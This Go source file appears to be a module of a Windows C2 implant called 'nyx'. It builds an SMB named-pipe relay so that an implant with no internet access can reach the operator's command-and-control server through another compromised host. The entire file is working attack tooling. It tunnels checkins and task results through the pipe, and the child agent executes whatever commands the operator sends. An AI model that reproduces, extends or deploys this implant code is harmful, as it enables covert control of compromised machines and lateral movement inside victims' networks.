//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── SMB Named Pipe P2P Relay ─────────────────────────────────────────────────
//
// Allows agent chaining: an agent with no internet access (Agent B) connects
// to an agent that has HTTP C2 access (Agent A) via a named pipe.
//
//   [Operator C2 Server]
//         ↕  HTTP
//   [Agent A — pipe server] ←→ \\.\pipe\nyx_<id>
//         ↕  Named Pipe
//   [Agent B — pipe client] (no internet, LAN only)
//
// Agent B's checkins and task results are serialized as JSON and relayed
// through the pipe by Agent A as if they were its own child agents.

const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_MESSAGE        = 0x00000004
	PIPE_READMODE_MESSAGE    = 0x00000002
	PIPE_WAIT                = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
	NMPWAIT_WAIT_FOREVER     = 0xFFFFFFFF
	FILE_FLAG_OVERLAPPED     = 0x40000000
)

var (
	kernel32Pipe             = windows.NewLazySystemDLL("kernel32.dll")
	procCreateNamedPipe      = kernel32Pipe.NewProc("CreateNamedPipeW")
	procConnectNamedPipe     = kernel32Pipe.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe  = kernel32Pipe.NewProc("DisconnectNamedPipe")
	procWaitNamedPipe        = kernel32Pipe.NewProc("WaitNamedPipeW")
)

var (
	pipeServerMu   sync.Mutex
	pipeServerRunning bool
	pipeServerName string
	pipeServerStop chan struct{}
	pipeClients    []windows.Handle // connected pipe handles
)

// startPipeServer creates a named pipe and accepts inbound agent connections.
// pipeName is just the suffix: the full path becomes \\.\pipe\nyx_<pipeName>
func startPipeServer(pipeName string) (string, error) {
	pipeServerMu.Lock()
	defer pipeServerMu.Unlock()

	if pipeServerRunning {
		return fmt.Sprintf("[*] Pipe server already running: %s", pipeServerName), nil
	}

	fullName := `\\.\pipe\nyx_` + pipeName
	pipeServerName = fullName
	pipeServerStop = make(chan struct{})
	pipeServerRunning = true

	go pipeServerLoop(fullName)
	return fmt.Sprintf("[+] SMB pipe server started: %s", fullName), nil
}

func stopPipeServer() string {
	pipeServerMu.Lock()
	defer pipeServerMu.Unlock()
	if !pipeServerRunning {
		return "[*] Pipe server not running"
	}
	close(pipeServerStop)
	pipeServerRunning = false
	return fmt.Sprintf("[+] Pipe server stopped: %s", pipeServerName)
}

func pipeServerLoop(fullName string) {
	namePtr, _ := windows.UTF16PtrFromString(fullName)

	for {
		select {
		case <-pipeServerStop:
			return
		default:
		}

		// Create a new pipe instance for the next client
		hPipe, _, err := procCreateNamedPipe.Call(
			uintptr(unsafe.Pointer(namePtr)),
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			65536, // outBufSize
			65536, // inBufSize
			0,     // defaultTimeout
			0,     // securityAttributes
		)
		if windows.Handle(hPipe) == windows.InvalidHandle {
			fmt.Printf("[-] CreateNamedPipe: %v\n", err)
			time.Sleep(2 * time.Second)
			continue
		}

		// Wait for a client to connect
		r, _, e := procConnectNamedPipe.Call(hPipe, 0)
		if r == 0 {
			windows.CloseHandle(windows.Handle(hPipe))
			if e == windows.ERROR_PIPE_CONNECTED {
				// Client connected before ConnectNamedPipe — still valid
			} else {
				continue
			}
		}

		pipeServerMu.Lock()
		pipeClients = append(pipeClients, windows.Handle(hPipe))
		pipeServerMu.Unlock()

		go pipeHandleClient(windows.Handle(hPipe), fullName)
	}
}

// pipeHandleClient reads relay frames from a connected child agent and
// forwards them to the C2 server on the child's behalf.
type pipeFrame struct {
	Type    string `json:"type"`   // "checkin" | "result"
	AgentID string `json:"agent_id,omitempty"`
	Payload []byte `json:"payload"` // raw JSON body
}

func pipeHandleClient(hPipe windows.Handle, pipeName string) {
	defer func() {
		procDisconnectNamedPipe.Call(uintptr(hPipe))
		windows.CloseHandle(hPipe)
		pipeServerMu.Lock()
		for i, h := range pipeClients {
			if h == hPipe {
				pipeClients = append(pipeClients[:i], pipeClients[i+1:]...)
				break
			}
		}
		pipeServerMu.Unlock()
	}()

	buf := make([]byte, 65536)
	for {
		var read uint32
		err := windows.ReadFile(hPipe, buf, &read, nil)
		if err != nil {
			if err == io.EOF || err == windows.ERROR_BROKEN_PIPE {
				return
			}
			continue
		}
		if read == 0 {
			continue
		}

		var frame pipeFrame
		if err := json.Unmarshal(buf[:read], &frame); err != nil {
			continue
		}

		// Relay the child agent's request to C2 on its behalf
		var reply []byte
		var relayErr error
		switch frame.Type {
		case "checkin":
			reply, relayErr = pipeRelayCheckin(frame.Payload)
		case "result":
			reply, relayErr = pipeRelayResult(frame.AgentID, frame.Payload)
		}
		if relayErr != nil {
			errFrame, _ := json.Marshal(map[string]string{"error": relayErr.Error()})
			var written uint32
			windows.WriteFile(hPipe, errFrame, &written, nil)
			continue
		}

		var written uint32
		windows.WriteFile(hPipe, reply, &written, nil)
	}
}

// pipeRelayCheckin forwards a child agent's checkin to the C2 and returns the response.
func pipeRelayCheckin(body []byte) ([]byte, error) {
	uri := C2URL + profileURI(ProfileCheckin, "")
	resp, err := profileDo("POST", uri, newBytesReader(body))
	if err != nil {
		return nil, fmt.Errorf("relay checkin: %w", err)
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// pipeRelayResult forwards a child agent's task result.
func pipeRelayResult(agentID string, body []byte) ([]byte, error) {
	uri := C2URL + profileURI(ProfileResult, agentID)
	resp, err := profileDo("POST", uri, newBytesReader(body))
	if err != nil {
		return nil, fmt.Errorf("relay result: %w", err)
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// ─── SMB Pipe Client (child agent mode) ──────────────────────────────────────

// connectToPipeServer connects this agent to an existing pipe server on the LAN.
// Once connected, all C2 traffic is tunneled through the pipe instead of HTTP.
func connectToPipeServer(serverHost, pipeName string) (string, error) {
	fullName := `\\` + serverHost + `\pipe\nyx_` + pipeName

	namePtr, _ := windows.UTF16PtrFromString(fullName)
	procWaitNamedPipe.Call(uintptr(unsafe.Pointer(namePtr)), NMPWAIT_WAIT_FOREVER)

	hPipe, err := windows.CreateFile(
		namePtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil,
		windows.OPEN_EXISTING,
		0, 0,
	)
	if err != nil {
		return "", fmt.Errorf("CreateFile(%s): %w", fullName, err)
	}

	// Switch to message-read mode
	mode := uint32(PIPE_READMODE_MESSAGE)
	setMode := kernel32Pipe.NewProc("SetNamedPipeHandleState")
	setMode.Call(uintptr(hPipe), uintptr(unsafe.Pointer(&mode)), 0, 0)

	// Start using pipe as transport for C2 traffic
	go pipeClientLoop(hPipe, fullName)
	return fmt.Sprintf("[+] Connected to relay pipe %s — C2 now tunneled via SMB", fullName), nil
}

// pipeClientLoop replaces the HTTP checkin loop with a pipe-based one.
// This runs as an independent goroutine and relays all C2 comms through the pipe.
func pipeClientLoop(hPipe windows.Handle, pipeName string) {
	defer windows.CloseHandle(hPipe)
	fmt.Printf("[*] SMB pipe client loop started: %s\n", pipeName)

	hostname, _ := windows.ComputerName()
	payload, _ := json.Marshal(CheckinRequest{
		Hostname: hostname,
		Username: "pipe-agent",
		OS:       "windows",
		Arch:     "amd64",
		PubKey:   ecdhPubHex,
	})

	frame, _ := json.Marshal(pipeFrame{Type: "checkin", Payload: payload})
	var written uint32
	windows.WriteFile(hPipe, frame, &written, nil)

	buf := make([]byte, 65536)
	var readN uint32
	windows.ReadFile(hPipe, buf, &readN, nil)

	var resp CheckinResponse
	json.Unmarshal(buf[:readN], &resp)
	if resp.ServerPub != "" && !ecdhDone {
		deriveSessionKey(resp.ServerPub)
	}

	fmt.Printf("[+] SMB pipe checkin complete, agent ID: %s\n", resp.AgentID)

	// Continue processing tasks delivered via pipe
	for {
		if resp.Task != nil {
			output, status := dispatch(resp.Task.Command)
			result := TaskResult{TaskID: resp.Task.ID, Output: output, Status: status}
			resultJSON, _ := json.Marshal(result)
			resultFrame, _ := json.Marshal(pipeFrame{
				Type:    "result",
				AgentID: resp.AgentID,
				Payload: resultJSON,
			})
			windows.WriteFile(hPipe, resultFrame, &written, nil)
		}

		// Next checkin
		time.Sleep(5 * time.Second)
		checkinJSON, _ := json.Marshal(CheckinRequest{Hostname: hostname, Username: "pipe-agent", OS: "windows", Arch: "amd64"})
		nextFrame, _ := json.Marshal(pipeFrame{Type: "checkin", AgentID: resp.AgentID, Payload: checkinJSON})
		windows.WriteFile(hPipe, nextFrame, &written, nil)

		buf = make([]byte, 65536)
		var n uint32
		if err := windows.ReadFile(hPipe, buf, &n, nil); err != nil {
			fmt.Printf("[-] Pipe read error: %v\n", err)
			return
		}
		json.Unmarshal(buf[:n], &resp)
	}
}

func smbPipeStatus() string {
	pipeServerMu.Lock()
	defer pipeServerMu.Unlock()
	if !pipeServerRunning {
		return "[*] SMB pipe server not running"
	}
	return fmt.Sprintf("[+] SMB pipe server: %s | clients: %d", pipeServerName, len(pipeClients))
}
